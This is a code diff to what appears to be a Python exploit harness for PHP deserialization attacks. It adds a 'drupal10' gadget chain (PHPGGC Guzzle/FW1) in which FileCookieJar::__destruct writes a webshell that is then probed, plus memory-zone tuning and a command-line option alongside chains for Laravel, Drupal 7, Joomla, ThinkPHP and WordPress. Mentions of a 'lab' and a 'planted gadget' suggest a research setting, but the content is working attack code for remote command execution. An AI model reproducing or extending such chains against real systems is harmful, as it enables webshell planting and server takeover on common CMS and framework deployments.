@@ -535,6 +535,15 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
         OUT_MARKER = f"PWNED{random.randrange(1 << 40):010x}"
         lab.set_gadget("laravel", f"{command};echo {OUT_MARKER}")
         ACTIVE_FILLERS = N_FILLERS
+    elif chain == "drupal10":
+        # PHPGGC Guzzle/FW1 from Drupal's own vendor tree (guzzle
+        # ships with core): FileCookieJar::__destruct writes this run's
+        # random webshell; the hit signal is the probe of that shell
+        # (FileCache flow - no marker). Bio geometry: the target's
+        # settings.php snippet stores the field.
+        OUT_MARKER = None
+        lab.set_gadget("drupal10")
+        ACTIVE_FILLERS = N_FILLERS
     elif chain == "thinkphp":
         # PHPGGC ThinkPHP/RCE3 from ThinkPHP's own vendor tree
         # (league/flysystem + think\Validate): Psr6Cache::__destruct ->
@@ -681,6 +690,8 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
                 zone = (38_000_000, 54_000_000)
             elif chain == "drupal":
                 zone = (13_000_000, 23_000_000)
+            elif chain == "drupal10":
+                zone = (6_000_000, 18_000_000)
             elif chain == "thinkphp":
                 zone = (18_000_000, 30_000_000)
             else:
@@ -712,12 +723,13 @@ def main() -> int:
                    help="maximum interruption attempts (default 40)")
     p.add_argument("--chain",
                    choices=("filecache", "wordpress", "laravel", "drupal",
-                            "joomla", "thinkphp"),
+                            "drupal10", "joomla", "thinkphp"),
                    default="filecache",
                    help="planted gadget: the lab's FileCache (default), "
                         "WordPress core (WP_HTML_Token), Laravel's vendor "
                         "tree (PHPGGC Laravel/RCE9), Drupal core "
-                        "(PHPGGC Drupal7/RCE1), Joomla core "
+                        "(PHPGGC Drupal7/RCE1), Drupal 10's vendor tree "
+                        "(PHPGGC Guzzle/FW1), Joomla core "
                         "(PHPGGC Joomla/FW1) or ThinkPHP's vendor tree "
                         "(PHPGGC ThinkPHP/RCE3)")
     p.add_argument("-q", "--quiet", action="store_true")
